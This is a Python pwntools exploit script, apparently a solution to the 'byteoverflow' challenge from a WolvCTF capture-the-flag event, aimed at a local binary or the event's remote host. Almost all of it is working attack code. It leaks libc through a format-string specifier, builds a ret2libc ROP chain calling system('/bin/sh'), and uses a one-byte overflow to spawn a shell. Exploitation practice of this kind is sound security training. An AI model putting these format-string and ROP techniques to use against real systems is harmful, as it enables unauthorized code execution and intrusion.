#!/usr/bin/python3

from pwn import *

exe = ELF('byteoverflow_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x40140E
                b* 0x0000000000401327
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('byteoverflow.wolvctf.io', 1337)
else:
        p = process(exe.path)

GDB()
sla(b'3) EXIT', b'2')
sla(b'below:', b'%45$p')
p.recvuntil(b'following: \n')
libc.address = int(p.recvline(keepends=False), 16) - 0x24083
info("libc.address " + hex(libc.address))

pop_rdi = 0x0000000000023b6a + libc.address
ret = pop_rdi + 1
sla(b'3) EXIT', b'1')
payload = p64(ret)*28
payload += flat(
        pop_rdi, next(libc.search(b'/bin/sh')), libc.sym.system
)
payload = payload.ljust(256)
payload += p8(0)
sla(b'Stealth Mode', payload)
p.interactive()
